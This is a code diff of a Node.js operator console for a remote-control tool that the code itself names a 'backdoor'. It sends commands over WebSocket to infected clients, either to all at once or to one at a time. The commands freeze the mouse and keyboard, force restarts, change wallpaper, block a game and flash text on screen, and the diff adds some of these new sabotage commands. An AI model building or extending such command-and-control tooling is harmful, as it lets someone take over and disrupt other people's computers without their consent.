@@ -1,11 +1,10 @@
 const WebSocket = require("ws"); // CJS Only for packing (pkg)
 const readline = require("readline");
 
-require("dotenv").config()
+// const ws = new WebSocket("wss://backdoor-freezeee.onrender.com");
+const ws = new WebSocket("ws://localhost:8602");
 
-const ws = new WebSocket("wss://backdoor-freezeee.onrender.com");
-
-const optionsTable = `M - Freeze Mouse         K - Freeze Keyboard\nUM - Unfreeze Mouse      UK - Unfreeze Keyboard\nI - Image                CW - Change Wallpaper\nC - Calculator           FR - Force Restart\nSF - Safe Restart        AU - Audio\nCUI - COOK PC UI!!\nBYE - Turns off a client\n\nLC - List Clients\n\nIf want to send to all clients, then type: 'a|(command)|opc arg1)'`;
+const optionsTable = `M - Freeze Mouse         K - Freeze Keyboard\nUM - Unfreeze Mouse      UK - Unfreeze Keyboard\nI - Image                CW - Change Wallpaper\nC - Calculator           FR - Force Restart\nSF - Safe Restart        AU - Audio\nCUI - COOK PC UI!!       BYE - Turns off a client\nT_(word)_secs - Puts a word on screen\n\nLC - List Clients\n\nIf want to send to all clients, then type: 'a|(command)|opc arg1)'`;
 
 const rl = readline.createInterface({
   input: process.stdin,
@@ -22,9 +21,12 @@ const commandsMap = {
   "CUI": "COOK_PC_UI",
   "AU": "AUDIO",
   "CW": "CHANGE_WALLPAPER",
-  "BYE": "BYE",
+  "T_": "TEXT_",
   "FR": "FORCE_RESTART",
   "SF": "SAFE_RESTART",
+  "BV": "BLOCK_VALORANT",
+  "UV": "UNBLOCK_VALORANT",
+  "BYE": "BYE",
   spcArgs: { "A": "ALL" }
 };
 
@@ -34,6 +36,7 @@ function connect() {
     console.log("Connected to server\n");
     ws.send("ADM");
 
+    console.log("DO NOT PUT '_' NOR '|' ON T_... PLEASE!\n")
     console.log(optionsTable);
 
     rl.on("line", (input) => {
@@ -53,26 +56,33 @@ function connect() {
         return;
       }
 
-      // {SPECIAL}|COMMAND|{opc.. Arg1}
+      // {SPECIAL}|COMMAND|{opt.. Arg1}
       const target = command.split(sep)[0];
       const key = command.split(sep)[1].toUpperCase();
       const arg1 = command.split(sep)[2]
 
       let sendString = "";
 
-      if (!commandsMap[key]) {
+      if (!commandsMap[key] && !key.startsWith("T_")) {
         console.log("Bad Command");
 
         return;
       }
 
       if (commandsMap.spcArgs[target.toUpperCase()])
-        sendString += commandsMap.spcArgs[target.toUpperCase()] + "|";
+        sendString += commandsMap.spcArgs[target.toUpperCase()];
       else
-        sendString += target.toLowerCase() + "|";
-      sendString += commandsMap[key];
+        sendString += target.toLowerCase();
+      sendString += "|" + (key.startsWith("T_") ? "TEXT_" : commandsMap[key]);
 
-      if (arg1) sendString += "|" + arg1;
+      if (key.startsWith("T_")) {
+        const secs = key.split("_")[2];
+        sendString += key.split("_")[1].trim()
+
+        if (/^\d+$/.test(secs))
+          sendString += ("_" + secs);
+      }
+      else if (arg1) sendString += "|" + arg1;
 
       sendString = sendString.trim();
       console.log("Sent:", sendString);
@@ -81,7 +91,7 @@ function connect() {
   });
 
   ws.on("message", (data) => {
-    console.log("Message:", data.toString(), "\n");
+    console.log("Server sent:", data.toString(), "\n");
   });
 
   ws.on("close", () => {
